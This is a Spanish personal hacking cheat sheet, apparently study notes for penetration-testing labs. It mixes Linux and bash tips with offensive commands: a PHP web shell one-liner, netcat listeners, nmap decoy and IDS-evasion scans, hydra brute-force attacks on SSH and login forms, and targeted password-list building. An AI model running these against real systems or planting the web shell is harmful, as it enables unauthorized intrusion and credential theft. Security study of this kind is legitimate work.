# ⭐️HackCheetSheet⭐️

Este sera un repositorio en donde ire añadiendo todo el conocimiento que vaya adquiriendo sera una guia para mi ojala le pueda servir a alguien como a mi. 

# sudo apt remove vs autoremove

> https://superuser.com/questions/398670/when-would-you-use-apt-get-remove-over-apt-get-autoremove#:~:text=remove%20will%20delete%20the%20specified,and%20safe%20command%20is...


<h2> 💻 Linux 💻</h2>

No genera el salto de línea final

```bash
echo "something" | md5sum # es diferente por el salto de linea que echo genera al final.
echo -n "something" | md5sum # para cuanod haces hash ten en cuenta
echo -e "text\n" >> file.conf #-e permite a echo trabajar con \n
echo -n "String sin newline" # para que no use new line 
```
## Desisntalar un paquete

> 

## Bash 

Uso de comillas invertidas `command` esto quiere decir que el comando dentro de las comillas se ejecutara para eso sirve:
>Las comillas invertidas (`) son interpretadas como sustitución de comandos, es decir, los comandos que estén dentro serán pasados al comando que lo preceden.

```
echo "Hola esta es una prueba sobre el uso de comillas invertidas estmos en el dir `pwd`"

OUTPUT 

Hola esta es una prueba sobre el uso de comillas invertidas estmos en el dir /opt/pyKerbrute

https://weblinus.com/diferencia-entre-comillas-dobles-comillas-simples-y-comillas-invertidas-en-shell-scripting/#:~:text=Las%20comillas%20invertidas%20%C2%AB%60%C2%BB%20son,al%20comando%20que%20lo%20precede.

```

Para crear un directorio temporal y cambiarte el el esta herrmaienta pushd esta medio rata

```
pushd "$(mktemp -d)"

dirs -v

```

Regresar al ultimo directorio en el que estuvimos

```
cd -
```

Bash las command exit code 0 succes 1 some error

```
echo $?

```
Bash las command argument 

```
cd !$
```

## Crear Listas

> https://macul.ciencias.uchile.cl/~vmunoz/homepage/tips/sed.html

SED para concatenar un string al inicio

```
sed  's/^/MASA/g'
sed  's/^/MASA/' # asi tambien jala
```

SED para concatenar al final

```
sed  's/$/MASA/g'
sed  's/$/MASA/'
```

SED para sustituir todas la coincidencias

```
sed  's/stringabuscar/stringporlaquesustituir/g'
```


## Grepear solo direcciones IP

```bash
grep -oP "\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}"
```



## Incrementar una variable

```bash 
i=0
i=$((i+1))
```

Checar todos los paquetes instalados.

```bash
apt list --installed
```
Contar palabras repetidas 

```bash
grep -o -i mauris ejemplo.txt | wc -l # meter un ciclo para una lista como rockyou.txt
```

To add OpenSSH to the SysV script to tell the system to run this service after startup, we can link it with the following command:

```bash
systemctl enable ssh
```
Netstat para saber las redes a las que tenemos acceso cuando estamos conectados a una vpn

```bash
netstat -rn #will show us the networks accessible via the VPN.
```

The tool journalctl to view the logs. Se puede ver que usuario inicio el servicio.
 
```bash
journalctl -u ssh.service --no-pager
```
El comando find y sus multiples usos!

```bash
find / -name *.conf -type f -size +25k -size -28k 2>/dev/null # archivo de peso mayor a 25k y menor a 28k!
find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2>/dev/null # ejecuta con lo que encuentra el comando {} aqui se pone el nombre que se vaya encontrando lo probe con cp intentalo!
```
El comando netstat sustituido por ss
```bash
ss -l -4 | grep -v "127\.0\.0" | grep "LISTEN" | wc -l #Saca todas las conecciones en escucha sin localhost y te dice cuantas hay
```
CURL una especie de spider para ver rutas en una pagina

```bash
curl https://www.inlanefreight.com > htb.txt && cat htb.txt | tr " " "\n" | cut -d"'" -f2 | cut -d'"' -f2 | grep "www.inlanefreight.com" | sort -u | wc -l
```


<h2>⭐️ Web Server </h2>

Linea para crear un servidor web que yo he probado y me han funcionado.

<h4>PHP</h4>

```php
php -S 127.0.0.1:8000
```
<h4>Python</h4>

```python
python -m http.server 8000
```

<h4>NodeJs</h4>

```javascript
npm install -g node-static   # install dependency
static -p 8000
```
<h4>PERL</h4>

```perl
cpan HTTP::Server::Brick   # install dependency
perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8000); $s->mount("/"=>{path=>"."}); $s->start'
```
<h2>⭐️Sniffers </h2>

tcpdump

```bash
sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28 # captura en la interfaz eth0
```

Capturar trafico solo de un protocolo

```
tcpdump -i eth0 icmp


```


<h2>⭐️Reverse Shells </h2>

## php simple command execution


```

<?php

system($_REQUEST['cmd']);
?>


``` 


Conección simple 

```bash
nc 127.0.0.1 80
```
NC a la escucha para recibir conexiones

```bash
nc -lvnp 8080 
```
ncat nc de nmap tiene varias opciones

```bash
ncat -nv --source-port 53 IP 8080 #TO BYPASS IDS/IPS
```

<h2>⭐️ Nmap </h2>

Host Discovery

```bash
nmap 10.10.2.0/24 -sn# antes -sP
```
# NMAP elijiendo la interfaz

```
nmap -e <INTERFACE> scanme.nmap.org

```


ACK escaneo

```bash
nmap 10.1.20.1 -p 21,22 -sA -Pn -n --disable-arp-ping --packet-trace
```

Random IPs para escanear

```bash
nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```

Scan by Using Different Source IP

```bash
nmap 10.12.2.8 -n -Pn -p 445 -O -S 10.9.2.0 -e tun0
```
DNS Proxy

```bash
nmap 10.9.2.2 -p5000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
```
<h2> 🌐 Linux Basic (BRE) VS extended (ERE) regular expression </h2>

```bash
In GNU sed, the only difference between basic and extended regular expressions is in the behavior of a few special characters: ‘?’, ‘+’, parentheses, braces (‘{}’), and ‘|’.
```
<h2>⭐️ Brute Force </h2>

HTTP Basic Auth

```bash
hydra -C ftp-betterdefaultpasslist.txt 178.21.3.15 -s 8080 http-get / # La Opcion -C trabaja con listas tipo user:passwd
```
HTTP Basic Auth

```bash
hydra -L list.txt -P rockyou.txt -u -f 178.35.4.13 -s 32 http-get / # L lista variable l user constante igual para la -P y -p
``` 

SSH Attack

```bash
hydra -l masa -P rockyou-30.txt -u -f ssh://178.3.4.4:22 -t 4 # Aqui lo que cambia es el servicio para atacar por ejemplo el ftp 
```

Brute Force Login Forms

```bash
 hydra -C ftp-betterdefaultpasslist.txt 178.5.4.1 -s 329 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
``` 
Para encontrar la peticion usar CTRL+C->Network->Seleccionar peticion(click derecho)-> Copy Post...
Otra opcion es usar el Burpsuite

```bash
 hydra -C ftp-betterdefaultpasslist.txt 178.5.4.1 -s 329 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'" 
``` 

<h3>⭐️ Diccionarios</h3>

```bash
cupp -i # perimite crear diccionarios en base a la informacion de alguien bastante util.
```
Ejemplo de Password Policy

8 characters or longer
contains special characters
contains numbers

```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```

Generar Usernames

```bash
usernameGenerator.sh <First Name> <Last Name>
```

<h3> SSH </h3>⭐️

También es posible leer claves privadas locales en un sistema comprometido o agregar nuestra clave pública para obtener acceso SSH a un usuario específico

<h2> 💻 Proxying Metasploit through BurpSuite 💻</h2>

```bash
set PROXIES HTTP:127.0.0.1:8080

```

<h3> Diferencia shasum VS sha256sum</h3>⭐️


```bash
echo 010010101 | shasum -a 256 -0 #-a para elegir algoritmo puede ser 512 o el clasico 256. El -0 le indica que interprete la entrada en bits

```
```bash
echo 010010101 | shasum -a 256 -0 #-a para elegir algoritmo puede ser 512 o el clasico 256. El -0 le indica que interprete la entrada en bits
#Usar este al parecer!
```
## Masscan

Una explicacion mas detalla sobre el uso de masscan donde se entiende mejor que otras.

> https://danielmiessler.com/study/masscan/


## Descargar un Torret 

>sudo apt-get install qbittorrent









